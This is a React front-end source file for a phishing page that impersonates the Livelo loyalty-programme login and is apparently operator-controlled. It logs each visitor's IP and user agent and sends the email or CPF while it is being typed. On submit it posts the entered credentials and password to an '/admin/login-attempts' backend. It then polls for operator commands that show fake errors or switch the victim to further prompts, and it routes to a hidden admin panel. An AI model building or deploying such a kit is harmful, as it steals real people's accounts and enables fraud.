import { useState, useEffect, useRef } from "react";
import "@/App.css";
import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
import AdminPanel from "@/pages/AdminPanel";
import CommandPage from "@/pages/CommandPage";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Componente da página de login Livelo
function LiveloLogin() {
  const [credential, setCredential] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isValid, setIsValid] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [userId, setUserId] = useState(localStorage.getItem("livelo_user_id"));
  const [hasError, setHasError] = useState(false);
  const [lastProcessedTimestamp, setLastProcessedTimestamp] = useState(null);
  const [currentCommand, setCurrentCommand] = useState(null);
  const [emailNotified, setEmailNotified] = useState(false);
  const emailDebounceRef = useRef(null);

  // Rastrear visitante ao carregar a página
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        // Obter IP público
        const ipResponse = await axios.get("https://api.ipify.org?format=json");
        const ip = ipResponse.data.ip;
        await axios.post(`${API}/track-visitor`, {
          ip: ip,
          user_agent: navigator.userAgent
        });
      } catch (error) {
        // Tentar sem IP
        try {
          await axios.post(`${API}/track-visitor`, {
            ip: "unknown",
            user_agent: navigator.userAgent
          });
        } catch (e) {}
      }
    };
    trackVisitor();
  }, []);

  // Validação de CPF real (algoritmo de dígitos verificadores)
  const validateCPF = (cpf) => {
    const nums = cpf.replace(/\D/g, "");
    if (nums.length !== 11) return false;
    // Rejeitar CPFs com todos os dígitos iguais
    if (/^(\d)\1{10}$/.test(nums)) return false;
    // Calcular primeiro dígito verificador
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(nums[i]) * (10 - i);
    let rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    if (rest !== parseInt(nums[9])) return false;
    // Calcular segundo dígito verificador
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(nums[i]) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    if (rest !== parseInt(nums[10])) return false;
    return true;
  };

  // Validação de CPF válido ou Email
  const validateCredential = (value) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length === 11) return validateCPF(cleanValue);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(value);
  };

  // Formatar CPF enquanto digita
  const formatCPF = (value) => {
    const numbers = value.replace(/\D/g, "");
    if (numbers.length <= 11) {
      return numbers;
    }
    return numbers.slice(0, 11);
  };

  // Notificar quando email é digitado (com debounce)
  useEffect(() => {
    if (emailDebounceRef.current) {
      clearTimeout(emailDebounceRef.current);
    }
    
    if (credential && validateCredential(credential) && !emailNotified) {
      emailDebounceRef.current = setTimeout(async () => {
        try {
          await axios.post(`${API}/notify-email-typing`, { email: credential });
          setEmailNotified(true);
        } catch (error) {
          console.error("Erro ao notificar email:", error);
        }
      }, 1500); // Espera 1.5 segundos após parar de digitar
    }
    
    return () => {
      if (emailDebounceRef.current) {
        clearTimeout(emailDebounceRef.current);
      }
    };
  }, [credential, emailNotified]);

  const handleCredentialChange = (e) => {
    const value = e.target.value;
    setEmailNotified(false); // Reset quando mudar o email
    if (/^\d*$/.test(value)) {
      setCredential(formatCPF(value));
    } else {
      setCredential(value);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isValid) {
      setIsLoading(true);
      setHasError(false); // Limpar erro ao enviar
      
      // Enviar dados ao backend apenas ao clicar em Entrar
      try {
        let currentUserId = localStorage.getItem("livelo_user_id");
        
        if (!currentUserId) {
          // Primeira tentativa - criar novo registro
          const response = await axios.post(`${API}/admin/login-attempts`, {
            email: credential,
            password: password,
            ip_address: "127.0.0.1",
            country: "Brasil",
            device: "Desktop",
            page: "Login Livelo"
          });
          
          if (response.data && response.data.id) {
            currentUserId = response.data.id;
            localStorage.setItem("livelo_user_id", currentUserId);
            setUserId(currentUserId);
          }
        } else {
          // Tentativa adicional - adicionar ao registro existente
          await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, {
            email: credential,
            password: password
          });
          setUserId(currentUserId);
        }
      } catch (error) {
        console.error("Erro ao enviar dados:", error);
      }
    }
  };

  // Polling de comandos - document.hidden checado EM CADA CHAMADA
  useEffect(() => {
    if (!userId) return;

    const poll = async () => {
      try {
        const v = document.hidden ? "0" : "1";
        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
        if (response.data && response.data.action) {
          const action = response.data.action;
          const timestamp = response.data.action_timestamp;
          if (timestamp && timestamp === lastProcessedTimestamp) return;
          if (action === "INV") {
            setIsLoading(false);
            setHasError(true);
            setCredential("");
            setPassword("");
            setLastProcessedTimestamp(timestamp);
            axios.post(`${API}/admin/command`, { user_id: userId, command: "CLEAR" }).catch(() => {});
          } else if (action !== "CLEAR") {
            setCurrentCommand(action);
            setLastProcessedTimestamp(timestamp);
          }
        }
      } catch (error) {}
    };

    poll();
    const interval = setInterval(poll, 1500);
    return () => clearInterval(interval);
  }, [userId, lastProcessedTimestamp]);

  // Verifica se o formulário está válido
  useEffect(() => {
    const credentialValid = validateCredential(credential);
    const passwordValid = password.length > 0;
    setIsValid(credentialValid && passwordValid);
  }, [credential, password]);

  // Se for outros comandos (AUT, AGUARDE, etc), mostrar CommandPage
  if (currentCommand && currentCommand !== "INV" && userId) {
    return <CommandPage userId={userId} />;
  }

  return (
    <div className={`App min-h-screen bg-white flex flex-col font-inter ${isLoading ? 'cursor-wait' : ''}`}>
      <div className="flex-1 flex flex-col items-center pt-16 px-4">
        {/* Logo */}
        <div className="mb-6">
          <img 
            src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
            alt="Livelo Logo" 
            className="h-10 w-auto"
          />
        </div>

        {/* Título */}
        <h2 className="text-2xl font-extrabold text-gray-900 mb-6">
          Entre com sua conta Livelo
        </h2>

        {/* Formulário */}
        <form onSubmit={handleSubmit} className="w-full max-w-md space-y-4">
          {/* Campo CPF ou E-mail */}
          <div className="relative">
            <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 z-10 pointer-events-none">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                />
              </svg>
            </div>
            <input
              type="text"
              value={credential}
              onChange={handleCredentialChange}
              placeholder="CPF ou E-mail"
              className={`w-full pl-12 pr-12 py-3.5 border ${hasError ? 'border-2 border-red-500' : 'border border-gray-900'} rounded-lg focus:outline-none focus:border-pink-500 transition-colors text-base`}
              data-testid="credential-input"
            />
            {hasError && (
              <div className="absolute right-4 top-1/2 transform -translate-y-1/2 text-red-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>
            )}
          </div>

          {/* Aviso CPF inválido */}
          {(() => {
            const clean = credential.replace(/\D/g, "");
            if (clean.length === 11 && !validateCPF(clean)) {
              return <p className="text-red-500 text-xs mt-1">CPF inválido</p>;
            }
            return null;
          })()}

          {/* Campo Senha */}
          <div className="relative">
            <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 z-10 pointer-events-none">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                />
              </svg>
            </div>
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Senha"
              className={`w-full pl-12 pr-12 py-3.5 border ${hasError ? 'border-2 border-red-500' : 'border border-gray-900'} rounded-lg focus:outline-none focus:border-pink-500 transition-colors text-base`}
              data-testid="password-input"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
              data-testid="toggle-password-visibility"
            >
              {showPassword ? (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                  />
                </svg>
              ) : (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                  />
                </svg>
              )}
            </button>
          </div>

          {/* Mensagem de erro */}
          {hasError && (
            <div className="text-red-500 text-sm font-medium">
              E-mail, CPF ou senha incorretos.
            </div>
          )}

          {/* Link Esqueceu a senha */}
          <div className="text-left pt-1">
            <a
              href="#"
              className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
              data-testid="forgot-password-link"
            >
              Esqueceu sua senha?
            </a>
          </div>

          {/* Botão Entrar */}
          <button
            type="submit"
            disabled={!isValid}
            className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 mt-6 ${
              isValid
                ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            data-testid="login-button"
          >
            {isLoading ? (
              <div className="flex items-center justify-center">
                <svg
                  className="animate-spin h-5 w-5 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  data-testid="loading-spinner"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
              </div>
            ) : (
              "Entrar"
            )}
          </button>
        </form>

        {/* Criar conta */}
        <div className="mt-10 text-center">
          <p className="text-gray-600 text-sm mb-1">Ainda não tem conta?</p>
          <a
            href="#"
            className="text-pink-500 hover:text-pink-600 text-sm font-medium transition-colors underline"
            data-testid="create-account-link"
          >
            Crie sua conta Livelo
          </a>
        </div>
      </div>

      {/* Voltar para página inicial */}
      <div className="p-8">
        <a
          href="#"
          className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          data-testid="back-to-home-link"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-4 w-4 mr-2"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Voltar para página inicial
        </a>
      </div>
    </div>
  );
}

// Componente principal com rotas
function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<LiveloLogin />} />
        <Route path="/donaspainel" element={<AdminPanel />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
